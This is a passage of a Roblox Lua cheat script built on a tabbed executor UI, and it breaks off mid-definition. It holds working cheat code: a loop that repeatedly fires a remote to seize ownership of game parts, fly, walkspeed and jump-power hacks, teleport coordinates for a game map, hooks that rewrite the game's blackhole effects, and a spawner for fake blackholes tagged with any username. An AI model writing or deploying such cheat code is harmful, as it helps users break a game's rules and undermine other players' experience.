        LogDebug('OwnerDoClaim: %s already in-flight, waiting', id)

        local dl = tick() + cfg.ClaimTimeoutSec

        while OwnerInFlight[id] and tick() < dl do
            task.wait(0.05)
        end

        if not part or not part.Parent then
            resolve(false)

            return
        end

        resolve(OwnerIsOwned(part))

        return
    end

    OwnerInFlight[id] = true

    if OwnerIsOwned(part) then
        LogDebug('OwnerDoClaim: %s already owned', id)

        OwnerInFlight[id] = nil

        resolve(true)

        return
    end

    local delay = cfg.RetryDelayBase
    local attempt = 0

    while attempt < cfg.MaxRetries do
        if not part or not part.Parent then
            LogWarn('OwnerDoClaim: part %s destroyed mid-claim', id)

            OwnerInFlight[id] = nil

            resolve(false)

            return
        end
        if (tick() - startT) >= cfg.ClaimTimeoutSec then
            LogWarn('OwnerDoClaim: timeout %s after %.1fs', id, tick() - startT)

            OwnerInFlight[id] = nil

            resolve(false)

            return
        end

        attempt = attempt + 1

        if Config.Debug.LogOwnershipSteps then
            LogDebug('OwnerDoClaim: attempt %d/%d %s', attempt, cfg.MaxRetries, id)
        end

        for _ = 1, cfg.FiresPerAttempt do
            if not part or not part.Parent then
                break
            end

            OwnerFireOnce(part)
            task.wait(cfg.FireInterval)
        end

        task.wait(cfg.PostFireWait)

        if not part or not part.Parent then
            LogWarn('OwnerDoClaim: part %s gone after fire burst', id)

            OwnerInFlight[id] = nil

            resolve(false)

            return
        end
        if OwnerIsOwned(part) then
            LogInfo('OwnerDoClaim: claimed %s on attempt %d', id, attempt)

            OwnerInFlight[id] = nil

            resolve(true)

            return
        end

        task.wait(delay)

        delay = math.min(delay * 1.5, cfg.RetryDelayMax)
    end

    LogWarn('OwnerDoClaim: FAILED %s after %d attempts', id, attempt)

    OwnerInFlight[id] = nil

    resolve(false)
end
function OwnerClaim(part, onDone)
    task.spawn(function()
        OwnerDoClaim(part, onDone or function() end)
    end)
end
function OwnerClaimSync(part)
    local result = nil

    task.spawn(function()
        OwnerDoClaim(part, function(ok)
            result = ok
        end)
    end)

    local dl = tick() + Config.Ownership.ClaimTimeoutSec + 1

    while result == nil and tick() < dl do
        task.wait(0.02)
    end

    return result == true
end

ICON_ID = '85604259645388'
NotifyTab = Tabs.Notify
activeEffect = 'Real'
syncEnabled = true
activeClones = {}
connections = {}
fakeBlackholes = {}

local LocalPlayer = game.Players.LocalPlayer
local TweenService = game:GetService('TweenService')

settings = {
    EffectSize = 1.8,
    ParticleBoost = 2,
    Brightness = 5,
    Emission = 1,
    SpinSpeed = 100,
    Transparency = 0.5,
    CustomColor = Color3.fromRGB(0, 255, 255),
    FakeBHDuration = 6,
    FakeBHSize = 10,
    FakeBHSpinSpeed = 2,
    FakeBHInnerSpinSpeed = 4,
    FakeBHExpandTime = 2,
    FakeBHShrinkTime = 1.5,
    FakeBHShowName = true,
}
effectAssets = {
    ['Blackhole Water 1'] = 'rbxassetid://76490441012398',
    ['Blackhole Water 2'] = 'rbxassetid://9528329581',
    ['Blackhole Void'] = 'rbxassetid://15601115261',
    ['Blackhole Singularity'] = 'rbxassetid://13481688755',
}
effectConfigs = {
    ['Blackhole Water 1'] = {
        Color = Color3.fromRGB(170, 0, 255),
        Material = Enum.Material.Neon,
        Brightness = 5,
    },
    ['Blackhole Water 2'] = {
        Color = Color3.fromRGB(0, 170, 255),
        Material = Enum.Material.Glass,
        Brightness = 3,
    },
    ['Blackhole Void'] = {
        Color = Color3.fromRGB(0, 0, 0),
        Material = Enum.Material.Neon,
        Brightness = 10,
    },
    ['Blackhole Singularity'] = {
        Color = Color3.fromRGB(255, 80, 0),
        Material = Enum.Material.ForceField,
        Brightness = 8,
    },
}
auraTextures = {
    'rbxassetid://243660364',
    'rbxassetid://8334210075',
    'rbxassetid://13686489138',
    'rbxassetid://14907882264',
    'rbxassetid://9275031349',
    'rbxassetid://10867789637',
    'rbxassetid://6023426923',
    'rbxassetid://13160452152',
    'rbxassetid://11290231574',
    'rbxassetid://12345678901',
    'rbxassetid://11584220431',
    'rbxassetid://11987654321',
    'rbxassetid://14022123890',
}

function preCleanModel(model)
    for _, v in ipairs(model:GetDescendants())do
        if v:IsA('Decal') or v:IsA('Texture') or v:IsA('SurfaceGui') then
            v:Destroy()
        elseif v:IsA('BasePart') then
            v.Anchored = true
            v.CanCollide = false
            v.CanTouch = false
            v.CanQuery = false
        end
    end
end
function applyEnhancedVisuals(clone)
    for _, v in ipairs(clone:GetDescendants())do
        if v:IsA('ParticleEmitter') then
            v.Color = ColorSequence.new(settings.CustomColor)
            v.LightEmission = settings.Emission
            v.LightInfluence = 0
            v.Brightness = settings.Brightness
            v.RotSpeed = NumberRange.new(settings.SpinSpeed * 0.5, settings.SpinSpeed)
        elseif v:IsA('BasePart') then
            v.Material = Enum.Material.Neon
            v.Color = settings.CustomColor
            v.CanCollide = false
            v.CanTouch = false
            v.CanQuery = false
            v.Transparency = math.clamp(settings.Transparency + 0.25, 0.75, 1)

            local s = v.Size

            if s.Y < 0.15 and (s.X > 6 or s.Z > 6) then
                v:Destroy()
            end
        elseif v:IsA('Decal') or v:IsA('Texture') then
            v:Destroy()
        end
    end
end
function applyEffect(v)
    if not syncEnabled or activeClones[v] then
        return
    end

    local hole = v:FindFirstChild('Hole')

    if not hole then
        return
    end

    hole.CanCollide = false
    hole.CanTouch = false
    hole.Transparency = 1

    local ok, template = pcall(function()
        return game:GetObjects(effectAssets[activeEffect])[1]
    end)

    if not ok or not template then
        return
    end

    local clone = template:Clone()

    preCleanModel(clone)

    clone.Parent = v

    applyEnhancedVisuals(clone)

    activeClones[v] = clone

    task.spawn(function()
        while v.Parent and syncEnabled and activeClones[v] == clone do
            local primary = (clone:IsA('BasePart') and clone) or clone.PrimaryPart or clone:FindFirstChildWhichIsA('BasePart')

            if primary then
                local scale = hole.Size.Magnitude * settings.EffectSize / math.max(primary.Size.Magnitude, 0.01)

                if clone:IsA('Model') then
                    clone:ScaleTo(scale)
                    clone:PivotTo(CFrame.new(hole.Position))
                else
                    clone.Size = hole.Size * settings.EffectSize
                    clone.Position = hole.Position
                end
            end

            task.wait()
        end

        if clone then
            clone:Destroy()
        end
    end)
end
function createProceduralAura(parentPart)
    local p = Instance.new('ParticleEmitter')

    p.Texture = 'rbxassetid://243660364'
    p.Rate = 80
    p.Lifetime = NumberRange.new(1.2, 2.5)
    p.Speed = NumberRange.new(0.5, 2)
    p.RotSpeed = NumberRange.new(-180, 180)
    p.SpreadAngle = Vector2.new(360, 360)
    p.LightEmission = 1
    p.Size = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 2),
        NumberSequenceKeypoint.new(1, 0),
    })
    p.Color = ColorSequence.new(settings.CustomColor)
    p.Parent = parentPart
end
function spawnFakeBlackhole(position, fakeName)
    local container = Instance.new('Folder')

    container.Name = 'FakeBlackhole'
    container.Parent = workspace

    table.insert(fakeBlackholes, container)

    local hole = Instance.new('Part')

    hole.Name = 'BlackHole'
    hole.Shape = Enum.PartType.Ball
    hole.Material = Enum.Material.Neon
    hole.Color = Color3.new(0, 0, 0)
    hole.Size = Vector3.new(0.05, 0.05, 0.05)
    hole.Position = position
    hole.Anchored = true
    hole.CanCollide = false
    hole.CanTouch = false
    hole.CanQuery = false
    hole.CastShadow = false
    hole.Parent = container

    local swirlGui = Instance.new('BillboardGui')

    swirlGui.Name = 'SwirlGui'
    swirlGui.Adornee = hole
    swirlGui.Size = UDim2.new(0, 0, 0, 0)
    swirlGui.AlwaysOnTop = false
    swirlGui.LightInfluence = 0
    swirlGui.Parent = hole

    function makeSwirl(scale, rotDir)
        local lbl = Instance.new('ImageLabel')

        lbl.Size = UDim2.new(scale, 0, scale, 0)
        lbl.AnchorPoint = Vector2.new(0.5, 0.5)
        lbl.Position = UDim2.new(0.5, 0, 0.5, 0)
        lbl.BackgroundTransparency = 1
        lbl.Image = 'rbxassetid://95669290540702'
        lbl.ImageColor3 = Color3.new(0, 0, 0)
        lbl.ImageTransparency = 0
        lbl.Parent = swirlGui

        return lbl, rotDir
    end

    local swirls = {
        {
            lbl = makeSwirl(1, 1),
        },
        {
            lbl = makeSwirl(0.75, -1),
        },
        {
            lbl = makeSwirl(0.5, 1),
        },
    }
    local outerSwirl, outerDir = makeSwirl(1, 1)
    local midSwirl, midDir = makeSwirl(0.75, -1)
    local innerSwirl, innerDir = makeSwirl(0.5, 1)

    for _, s in ipairs(swirls)do
        if s.lbl and s.lbl.Parent then
            s.lbl:Destroy()
        end
    end

    if settings.FakeBHShowName and fakeName and fakeName ~= '' then
        local Players = game:GetService('Players')
        local RunService = game:GetService('RunService')
        local localPlayer = Players.LocalPlayer
        local nameBillboard = Instance.new('BillboardGui')

        nameBillboard.Name = 'NameGui'
        nameBillboard.Adornee = hole
        nameBillboard.Size = UDim2.fromOffset(280, 36)
        nameBillboard.StudsOffset = Vector3.new(0, 0, 0)
        nameBillboard.AlwaysOnTop = true
        nameBillboard.LightInfluence = 0
        nameBillboard.MaxDistance = 50
        nameBillboard.Parent = hole

        local frame = Instance.new('Frame')

        frame.Size = UDim2.fromScale(1, 1)
        frame.BackgroundTransparency = 1
        frame.Parent = nameBillboard

        local nameLabel = Instance.new('TextLabel')

        nameLabel.Size = UDim2.fromScale(1, 1)
        nameLabel.BackgroundTransparency = 1
        nameLabel.Text = fakeName
        nameLabel.TextColor3 = Color3.new(1, 1, 1)
        nameLabel.Font = Enum.Font.BuilderSans
        nameLabel.TextSize = 17
        nameLabel.TextScaled = false
        nameLabel.AutomaticSize = Enum.AutomaticSize.None
        nameLabel.TextXAlignment = Enum.TextXAlignment.Center
        nameLabel.TextYAlignment = Enum.TextYAlignment.Center
        nameLabel.Parent = frame

        local MAX_DISTANCE = 50
        local running = true

        task.spawn(function()
            while running and hole.Parent and nameBillboard.Parent do
                local char = localPlayer.Character
                local root = char and char:FindFirstChild('HumanoidRootPart')

                if root then
                    local dist = (root.Position - hole.Position).Magnitude

                    nameBillboard.Enabled = dist < MAX_DISTANCE
                end

                task.wait(0.25)
            end
        end)
        hole.AncestryChanged:Connect(function(_, parent)
            if not parent then
                running = false
            end
        end)
    end

    local finalSize = settings.FakeBHSize
    local expandInfo = TweenInfo.new(settings.FakeBHExpandTime, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
    local shrinkInfo = TweenInfo.new(settings.FakeBHShrinkTime, Enum.EasingStyle.Back, Enum.EasingDirection.In)

    TweenService:Create(hole, expandInfo, {
        Size = Vector3.new(finalSize, finalSize, finalSize),
    }):Play()
    TweenService:Create(swirlGui, expandInfo, {
        Size = UDim2.new(finalSize * 1.8, 0, finalSize * 1.8, 0),
    }):Play()

    local spinning = true

    task.spawn(function()
        while spinning and hole.Parent do
            outerSwirl.Rotation = outerSwirl.Rotation + settings.FakeBHSpinSpeed
            midSwirl.Rotation = midSwirl.Rotation - (settings.FakeBHSpinSpeed * 1.5)
            innerSwirl.Rotation = innerSwirl.Rotation + (settings.FakeBHInnerSpinSpeed * 2)

            task.wait(0.03)
        end
    end)
    task.delay(settings.FakeBHDuration, function()
        spinning = false

        local shrinkHole = TweenService:Create(hole, shrinkInfo, {
            Size = Vector3.new(0.05, 0.05, 0.05),
        })
        local shrinkGui = TweenService:Create(swirlGui, shrinkInfo, {
            Size = UDim2.new(0, 0, 0, 0),
        })

        shrinkHole:Play()
        shrinkGui:Play()
        shrinkHole.Completed:Once(function()
            if container and container.Parent then
                container:Destroy()
            end

            for i, v in ipairs(fakeBlackholes)do
                if v == container then
                    table.remove(fakeBlackholes, i)

                    break
                end
            end
        end)
    end)

    return container
end

local RunService = game:GetService('RunService')

settings = settings or {}
settings.CustomAsset = 'rbxassetid://111278758469077'

local activeEffect = 'Lightning'
local loadedModel = nil
local targetAssetId = settings.CustomAsset or 'rbxassetid://111278758469077'

pcall(function()
    loadedModel = game:GetObjects(targetAssetId)[1]
end)

function scaleNumberSequence(ns, multiplier)
    if not ns then
        return
    end

    local keypoints = {}

    for _, kp in ipairs(ns.Keypoints)do
        table.insert(keypoints, NumberSequenceKeypoint.new(kp.Time, kp.Value * multiplier, kp.Envelope * multiplier))
    end

    return NumberSequence.new(keypoints)
end
function scaleNumberRange(nr, multiplier)
    if not nr then
        return
    end

    return NumberRange.new(nr.Min * multiplier, nr.Max * multiplier)
end
function watchForDrone(holeObj)
    for _, c in pairs(holeObj:GetDescendants())do
        if c.Name == 'Drone' then
            task.defer(function()
                if c and c.Parent then
                    c:Destroy()
                end
            end)
        end
    end

    holeObj.DescendantAdded:Connect(function(c)
        if c.Name == 'Drone' then
            task.defer(function()
                if c and c.Parent then
                    c:Destroy()
                end
            end)
        end
    end)
end
function applyChanges(child)
    if child.Name == 'Drone' then
        task.defer(function()
            if child and child.Parent then
                child:Destroy()
            end
        end)

        return
    end
    if child.Name == 'BillboardGui' and child:IsA('BillboardGui') then
        function hideGui()
            child.Enabled = false

            for _, element in pairs(child:GetDescendants())do
                pcall(function()
                    element.BackgroundTransparency = 1
                end)
                pcall(function()
                    element.TextTransparency = 1
                end)
                pcall(function()
                    element.ImageTransparency = 1
                end)
            end
        end

        hideGui()
        child.Changed:Connect(hideGui)
        child.DescendantAdded:Connect(hideGui)
    elseif child.Name == 'Hole' and child:IsA('BasePart') then
        task.wait(0.1)

        child.Transparency = 1

        child:GetPropertyChangedSignal('Transparency'):Connect(function()
            if child.Transparency ~= 1 then
                child.Transparency = 1
            end
        end)

        if activeEffect == 'Custom BH Asset' then
            pcall(function()
                loadedModel = game:GetObjects(settings.CustomAsset)[1]
            end)
        end
        if loadedModel and not child:GetAttribute('HasCustomHole') then
            child:SetAttribute('HasCustomHole', true)

            local clone = loadedModel:Clone()

            clone.Name = 'CustomHoleModel'
            clone.Parent = workspace

            local rotationOffset = CFrame.Angles(math.rad(90), 0, 0)
            local originalProps = {}

            function saveProps(obj)
                if obj:IsA('BasePart') then
                    originalProps[obj] = {
                        Size = obj.Size,
                    }
                elseif obj:IsA('SpecialMesh') or obj:IsA('BlockMesh') or obj:IsA('CylinderMesh') then
                    originalProps[obj] = {
                        Scale = obj.Scale,
                    }
                elseif obj:IsA('Attachment') then
                    originalProps[obj] = {
                        Position = obj.Position,
                    }
                elseif obj:IsA('ParticleEmitter') then
                    originalProps[obj] = {
                        Size = obj.Size,
                        Speed = obj.Speed,
                    }
                elseif obj:IsA('Beam') then
                    originalProps[obj] = {
                        Width0 = obj.Width0,
                        Width1 = obj.Width1,
                        CurveSize0 = obj.CurveSize0,
                        CurveSize1 = obj.CurveSize1,
                    }
                elseif obj:IsA('Trail') then
                    originalProps[obj] = {
                        WidthScale = obj.WidthScale,
                    }
                elseif obj:IsA('PointLight') or obj:IsA('SurfaceLight') or obj:IsA('SpotLight') then
                    originalProps[obj] = {
                        Range = obj.Range,
                    }
                end
            end

            if clone:IsA('Model') then
                local cframe = clone:GetBoundingBox()

                for _, part in pairs(clone:GetDescendants())do
                    if part:IsA('BasePart') then
                        part.Anchored = false
                        part.CanCollide = false

                        local offset = cframe:ToObjectSpace(part.CFrame)

                        part.CFrame = (child.CFrame * rotationOffset) * offset

                        local weld = Instance.new('WeldConstraint')

                        weld.Part0 = part
                        weld.Part1 = child
                        weld.Parent = part

                        for _, att in pairs(part:GetChildren())do
                            if att:IsA('Attachment') then
                                att.CFrame = rotationOffset * att.CFrame
                            end
                        end
                    end
                    if part:IsA('Script') then
                        part.Disabled = true

                        local newScript = Instance.new('Script')

                        newScript.Source = [[local part = script.Parent
local partspeed = 0.015

while task.wait() do
    part.CFrame = part.CFrame * CFrame.Angles(0, partspeed, 0)
end
]]
                        newScript.Parent = part.Parent
                    end
                end
            elseif clone:IsA('BasePart') then
                clone.Anchored = false
                clone.CanCollide = false
                clone.CFrame = child.CFrame * rotationOffset

                for _, att in pairs(clone:GetChildren())do
                    if att:IsA('Attachment') then
                        att.CFrame = rotationOffset * att.CFrame
                    end
                end

                local weld = Instance.new('WeldConstraint')

                weld.Part0 = clone
                weld.Part1 = child
                weld.Parent = clone
            end

            local soundPart = clone:IsA('BasePart') and clone or clone:FindFirstChildWhichIsA('BasePart', true)
            local bhSound

            if soundPart then
                bhSound = Instance.new('Sound')
                bhSound.SoundId = 'rbxassetid://71291438346620'
                bhSound.PlaybackSpeed = 0.5
                bhSound.Volume = 1.8
                bhSound.Looped = true
                bhSound.RollOffMaxDistance = 130
                bhSound.RollOffMinDistance = 15
                bhSound.Parent = soundPart

                bhSound:Play()
            end

            saveProps(clone)

            for _, obj in pairs(clone:GetDescendants())do
                saveProps(obj)
            end

            local isDestroying = false
            local shrinkAlpha = 1
            local shrinkSpeed = 1

            function onHoleDestroyed()
                if isDestroying then
                    return
                end

                isDestroying = true

                for _, obj in pairs(clone:GetDescendants())do
                    if obj:IsA('BasePart') then
                        obj.Anchored = true
                    end
                end

                if clone:IsA('BasePart') then
                    clone.Anchored = true
                end
            end

            child.AncestryChanged:Connect(function(_, newParent)
                if not newParent then
                    onHoleDestroyed()
                end
            end)

            local connection

            connection = RunService.Heartbeat:Connect(function(dt)
                if not clone or not clone.Parent then
                    connection:Disconnect()

                    return
                end
                if isDestroying then
                    shrinkAlpha = shrinkAlpha - (dt * shrinkSpeed)

                    if shrinkAlpha <= 0 then
                        shrinkAlpha = 0

                        connection:Disconnect()
                        clone:Destroy()

                        return
                    end
                    if bhSound then
                        bhSound.Volume = 2 * shrinkAlpha
                    end
                end

                local basePartScale = 0.5 * shrinkAlpha
                local effectScale = shrinkAlpha

                for obj, props in pairs(originalProps)do
                    if obj:IsA('BasePart') then
                        obj.Size = props.Size * basePartScale
                    elseif obj:IsA('SpecialMesh') or obj:IsA('BlockMesh') or obj:IsA('CylinderMesh') then
                        obj.Scale = props.Scale * basePartScale
                    elseif obj:IsA('Attachment') then
                        obj.Position = props.Position * basePartScale
                    elseif obj:IsA('ParticleEmitter') then
                        obj.Size = scaleNumberSequence(props.Size, effectScale)

                        if props.Speed then
                            obj.Speed = scaleNumberRange(props.Speed, effectScale)
                        end
                    elseif obj:IsA('Beam') then
                        obj.Width0 = props.Width0 * effectScale
                        obj.Width1 = props.Width1 * effectScale

                        if props.CurveSize0 then
                            obj.CurveSize0 = props.CurveSize0 * effectScale
                            obj.CurveSize1 = props.CurveSize1 * effectScale
                        end
                    elseif obj:IsA('Trail') then
                        obj.WidthScale = scaleNumberSequence(props.WidthScale, effectScale)
                    elseif obj:IsA('PointLight') or obj:IsA('SurfaceLight') or obj:IsA('SpotLight') then
                        obj.Range = props.Range * effectScale
                    end
                end
            end)
        end
    end
end
function handleBlackHoleKick(obj)
    for _, descendant in pairs(obj:GetDescendants())do
        if descendant.Name == 'Hole' and descendant:IsA('BasePart') then
            watchForDrone(descendant)
        end
    end

    obj.DescendantAdded:Connect(function(descendant)
        if descendant.Name == 'Hole' and descendant:IsA('BasePart') then
            watchForDrone(descendant)
        end
    end)

    for _, descendant in pairs(obj:GetDescendants())do
        applyChanges(descendant)
    end

    obj.DescendantAdded:Connect(applyChanges)
end

for _, descendant in pairs(workspace:GetDescendants())do
    if descendant.Name == 'BlackHoleKick' then
        handleBlackHoleKick(descendant)
    end
end

workspace.DescendantAdded:Connect(function(descendant)
    if descendant.Name == 'BlackHoleKick' then
        handleBlackHoleKick(descendant)
    end
end)

local VisualGroup = Tabs.BHTab:AddLeftGroupbox('Blackhole Visuals', 'eye')
local PhysicsGroup = Tabs.BHTab:AddRightGroupbox('Blackhole Settings', 'settings')
local FakeSetupGroup = Tabs.BHTab:AddLeftGroupbox('Fake Blackhole Spawner', 'zap')
local FakeVisualGroup = Tabs.BHTab:AddRightGroupbox('Fake Blackhole Settings', 'brush')

PhysicsGroup:AddCheckbox('BH_Enabled', {
    Text = 'Enable custom Blackhole',
    Tooltip = 'Shows the custom blackhole instead of the default one',
    Default = true,
})
Toggles.BH_Enabled:OnChanged(function(state)
    syncEnabled = state

    if not state then
        for _, obj in ipairs(activeClones)do
            if obj and obj.Parent then
                obj:Destroy()
            end
        end

        table.clear(activeClones)
    end
end)
VisualGroup:AddDropdown('EffectType', {
    Text = 'Effect Style',
    Values = {
        'Void Blackhole',
    },
    Default = 'Void Blackhole',
})
Options.EffectType:OnChanged(function(value)
    activeEffect = value

    if value == 'Custom BH Asset' then
        local ok, model = pcall(function()
            return game:GetObjects(settings.CustomAsset)[1]
        end)

        if ok and model then
            loadedModel = model
        end
    end
end)
VisualGroup:AddSlider('SizeSlider', {
    Text = 'Scale',
    Default = 1.8,
    Min = 0.5,
    Max = 5,
    Rounding = 1,
})
Options.SizeSlider:OnChanged(function(v)
    settings.EffectSize = v
end)
VisualGroup:AddSlider('GlowSlider', {
    Text = 'Glow Intensity',
    Default = 5,
    Min = 0,
    Max = 20,
    Rounding = 1,
})
Options.GlowSlider:OnChanged(function(v)
    settings.Brightness = v
end)
VisualGroup:AddSlider('SpinSlider', {
    Text = 'Rotation Speed',
    Default = 100,
    Min = 0,
    Max = 500,
    Rounding = 0,
})
Options.SpinSlider:OnChanged(function(v)
    settings.SpinSpeed = v
end)
VisualGroup:AddSlider('TransparencySlider', {
    Text = 'Opacity',
    Default = 5,
    Min = 0,
    Max = 10,
    Rounding = 1,
})
Options.TransparencySlider:OnChanged(function(v)
    settings.Transparency = v / 10
end)
VisualGroup:AddLabel('Color'):AddColorPicker('EffectColor', {
    Title = 'Primary Color',
    Default = Color3.fromRGB(0, 255, 255),
})
Options.EffectColor:OnChanged(function()
    settings.CustomColor = Options.EffectColor.Value

    for _, clone in ipairs(activeClones)do
        applyEnhancedVisuals(clone)
    end
end)

function getFakeInputs()
    return {
        name = Options.FakeBH_Name.Value,
        x = tonumber(Options.FakeBH_X.Value) or 0,
        y = tonumber(Options.FakeBH_Y.Value) or 10,
        z = tonumber(Options.FakeBH_Z.Value) or 0,
    }
end

FakeSetupGroup:AddInput('FakeBH_Name', {
    Text = 'Username',
    Default = 'Praise',
    Placeholder = 'Enter the username',
    Numeric = false,
})
FakeSetupGroup:AddInput('FakeBH_X', {
    Text = 'X',
    Default = '0',
    Placeholder = '0',
})
FakeSetupGroup:AddInput('FakeBH_Y', {
    Text = 'Y',
    Default = '10',
    Placeholder = '10',
})
FakeSetupGroup:AddInput('FakeBH_Z', {
    Text = 'Z',
    Default = '0',
    Placeholder = '0',
})
FakeSetupGroup:AddButton({
    Text = 'Spawn at Coordinates',
    Func = function()
        local i = getFakeInputs()

        spawnFakeBlackhole(Vector3.new(i.x, i.y, i.z), i.name)
    end,
})
FakeSetupGroup:AddButton({
    Text = 'Spawn at You',
    Func = function()
        local i = getFakeInputs()
        local char = LocalPlayer.Character

        if char and char:FindFirstChild('HumanoidRootPart') then
            spawnFakeBlackhole(char.HumanoidRootPart.Position + Vector3.new(0, 5, 0), i.name)
        end
    end,
})
FakeSetupGroup:AddButton({
    Text = 'Clear All',
    Func = function()
        for _, obj in ipairs(fakeBlackholes)do
            if obj and obj.Parent then
                obj:Destroy()
            end
        end

        table.clear(fakeBlackholes)
    end,
})
FakeVisualGroup:AddCheckbox('FakeBH_ShowName', {
    Text = 'Show Username',
    Default = true,
})
Toggles.FakeBH_ShowName:OnChanged(function(v)
    settings.FakeBHShowName = v
end)
FakeVisualGroup:AddSlider('FakeBH_Size', {
    Text = 'Size',
    Default = 10,
    Min = 3,
    Max = 40,
})
Options.FakeBH_Size:OnChanged(function(v)
    settings.FakeBHSize = v
end)
FakeVisualGroup:AddSlider('FakeBH_Duration', {
    Text = 'Lifetime',
    Default = 6,
    Min = 1,
    Max = 30,
})
Options.FakeBH_Duration:OnChanged(function(v)
    settings.FakeBHDuration = v
end)
FakeVisualGroup:AddSlider('FakeBH_ExpandTime', {
    Text = 'Expand Speed',
    Default = 20,
    Min = 5,
    Max = 50,
})
Options.FakeBH_ExpandTime:OnChanged(function(v)
    settings.FakeBHExpandTime = v / 10
end)
FakeVisualGroup:AddSlider('FakeBH_ShrinkTime', {
    Text = 'Shrink Speed',
    Default = 15,
    Min = 5,
    Max = 50,
})
Options.FakeBH_ShrinkTime:OnChanged(function(v)
    settings.FakeBHShrinkTime = v / 10
end)
FakeVisualGroup:AddSlider('FakeBH_SpinSpeed', {
    Text = 'Spin Speed',
    Default = 2,
    Min = 1,
    Max = 20,
})
Options.FakeBH_SpinSpeed:OnChanged(function(v)
    settings.FakeBHSpinSpeed = v
end)

Players = game:GetService('Players')
RunService = game:GetService('RunService')
UserInputService = game:GetService('UserInputService')
TweenService = game:GetService('TweenService')
Lighting = game:GetService('Lighting')
ReplicatedFirst = game:GetService('ReplicatedFirst')
Workspace = game:GetService('Workspace')
LocalPlayer = Players.LocalPlayer
Camera = Workspace.CurrentCamera
MovementTab = Tabs.PlayerTab
MovementBox = Tabs.PlayerTab:AddLeftGroupbox('Movement', 'footprints')
EnvBox = Tabs.PlayerTab:AddRightGroupbox('World', 'cloud-sun')
DetectorBox = Tabs.PlayerTab:AddLeftGroupbox('PCLD', 'scan-eye')
CosmeticBox = Tabs.PlayerTab:AddLeftGroupbox('Client', 'sparkles')
EmoteBox = Tabs.PlayerTab:AddRightGroupbox('Emotes', 'drama')
DanceBox = Tabs.PlayerTab:AddLeftGroupbox('Dances', 'music')
FTAPBox = Tabs.PlayerTab:AddRightGroupbox('Poses', 'person-standing')
TeleportLocations = {
    Spawn = CFrame.new(0, -7.35, 0),
    SpawnCave = CFrame.new(-90, 14.6, -314.3),
    GreenHouse = CFrame.new(-538, -7, 74),
    PinkHouse = CFrame.new(-478, -7, -147),
    Barn = CFrame.new(-228, 82, -318),
    BlueHouse = CFrame.new(496, 83, -350),
    ChineseHouse = CFrame.new(542, 123, -93),
    PurpleHouse = CFrame.new(270, -7, 448),
    Factory = CFrame.new(134, 347, 352),
    CaveBig = CFrame.new(-245, 80, 485),
    Prison = CFrame.new(195, -7, -561),
    Beach = CFrame.new(-546.97, -5.3, -41.09),
}
Movement = Movement or {
    Speed = {
        Enabled = false,
        Value = 16,
    },
    Jump = {
        Enabled = false,
        Value = 50,
        Default = 25,
    },
    Fly = {
        Enabled = false,
        Speed = 120,
        Connection = nil,
    },
    InfiniteJump = false,
}
sprintEnabled = false
jumpEnabled = false
infiniteJump = false

local flyVelocity, flyGyro

function stopFly()
    if Movement.Fly.Connection then
        Movement.Fly.Connection:Disconnect()

        Movement.Fly.Connection = nil
    end
    if flyVelocity then
        flyVelocity:Destroy()
    end
    if flyGyro then
        flyGyro:Destroy()
    end

    flyVelocity, flyGyro = nil, nil

    local char = LocalPlayer.Character

    if not char then
        return
    end

    local hum = char:FindFirstChildOfClass('Humanoid')
    local root = char:FindFirstChild('HumanoidRootPart')

    if hum then
        hum.PlatformStand = false

        hum:ChangeState(Enum.HumanoidStateType.GettingUp)
    end
    if root then
        root.AssemblyLinearVelocity = Vector3.zero
        root.AssemblyAngularVelocity = Vector3.zero
    end
end
function startFly()
    stopFly()

    if not Movement.Fly.Enabled then
        return
    end

    Movement.Fly.Connection = RunService.RenderStepped:Connect(function()
        local char = LocalPlayer.Character

        if not char then
            return
        end

        local hum = char:FindFirstChildOfClass('Humanoid')
        local root = char:FindFirstChild('HumanoidRootPart')

        if not hum or not root then
            return
        end

        local controlPart = (hum.Sit and hum.SeatPart and hum.SeatPart.AssemblyRootPart) or root

        if not flyVelocity or flyVelocity.Parent ~= controlPart then
            if flyVelocity then
                flyVelocity:Destroy()
            end

            flyVelocity = Instance.new('BodyVelocity')
            flyVelocity.MaxForce = Vector3.new(1e9, 1e9, 1e9)
            flyVelocity.Parent = controlPart
        end
        if not flyGyro or flyGyro.Parent ~= controlPart then
            if flyGyro then
                flyGyro:Destroy()
            end

            flyGyro = Instance.new('BodyGyro')
            flyGyro.MaxTorque = Vector3.new(1e9, 1e9, 1e9)
            flyGyro.D = 100
            flyGyro.Parent = controlPart
        end

        local move = Vector3.zero

        if UserInputService:IsKeyDown(Enum.KeyCode.W) then
            move += Vector3.new(0, 0, -1)
        end
        if UserInputService:IsKeyDown(Enum.KeyCode.S) then
            move += Vector3.new(0, 0, 1)
        end
        if UserInputService:IsKeyDown(Enum.KeyCode.A) then
            move += Vector3.new(-1, 0, 0)
        end
        if UserInputService:IsKeyDown(Enum.KeyCode.D) then
            move += Vector3.new(1, 0, 0)
        end
        if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
            move += Vector3.new(0, 1, 0)
        end
        if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
            move += Vector3.new(0, -1, 0)
        end

        local camCF = workspace.CurrentCamera.CFrame
        local speed = Movement.Fly.Speed or 120

        if move.Magnitude > 0 then
            flyVelocity.Velocity = (camCF.LookVector * -move.Z + camCF.RightVector * move.X + Vector3.new(0, move.Y, 0)) * speed
        else
            flyVelocity.Velocity = Vector3.zero
        end

        flyGyro.CFrame = CFrame.new(controlPart.Position, controlPart.Position + camCF.LookVector)
        hum.PlatformStand = not hum.Sit
    end)
end

SpeedToggle = MovementBox:AddCheckbox('WalkspeedKeyToggle', {
    Text = 'Walkspeed',
    Default = false,
    Callback = function(v)
        sprintEnabled = v
    end,
})
SpeedKey = SpeedToggle:AddKeyPicker('SpeedKeybind', {
    Default = 'None',
    Text = 'Speed Key',
    Mode = 'Toggle',
    Callback = function(state)
        sprintEnabled = state
    end,
})

MovementBox:AddSlider('WalkspeedValue', {
    Text = 'Speed',
    Min = 0,
    Max = 500,
    Default = 16,
    Increment = 1,
    ValueName = 'studs/s',
    Callback = function(v)
        Movement.Speed.Value = v
    end,
})
SpeedKey:OnChanged(function()
    Movement.Speed.KeybindEnabled = SpeedKey.Value
end)
MovementBox:AddCheckbox('JumpToggle', {
    Text = 'Jump Power',
    Default = false,
    Callback = function(v)
        jumpEnabled = v
    end,
})
MovementBox:AddSlider('JumpValue', {
    Text = 'Jump Force',
    Min = 0,
    Max = 500,
    Default = 50,
    Increment = 5,
    ValueName = 'force',
    Callback = function(v)
